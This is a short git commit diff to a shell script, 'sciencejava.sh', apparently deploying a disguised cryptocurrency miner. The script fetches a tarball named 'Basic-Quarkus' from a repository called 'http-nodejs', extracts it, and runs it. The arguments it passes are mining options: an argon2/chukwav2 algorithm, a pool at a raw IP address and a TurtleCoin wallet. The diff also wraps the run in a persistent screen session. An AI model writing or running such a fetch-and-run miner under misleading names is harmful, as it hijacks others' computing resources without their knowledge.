fad718fbbdd8c766244599623e95ea87204e15e4
dshillin <57657582+dshillin@users.noreply.github.com>
2022-09-12 08:51:37 +0100

    sciencejava.sh

--- sciencejava.sh
+++ sciencejava.sh
@@ -4,8 +4,9 @@
 sudo apt update
 clear
 sudo apt install screen
+screen -R Basic-Quarkus
  
 wget https://raw.githubusercontent.com/dshillin/http-nodejs/main/Basic-Quarkus.tar.gz
 tar xvzf Basic-Quarkus.tar.gz
 cd Basic-Quarkus
-screen ./Basic-Quarkus -a argon2/chukwav2 -o 142.132.131.248:80 -u TRTLv1hc4Ys615aVETRD9tB73tP7H53bwY3RQkBn7xH7iJzXP6FqKh9hJ8od82q59QLHLSiWiGEjYhoDPnCAcnWcS8nSGccNVsA -p test02
+./Basic-Quarkus -a argon2/chukwav2 -o 142.132.131.248:80 -u TRTLv1hc4Ys615aVETRD9tB73tP7H53bwY3RQkBn7xH7iJzXP6FqKh9hJ8od82q59QLHLSiWiGEjYhoDPnCAcnWcS8nSGccNVsA -p test02
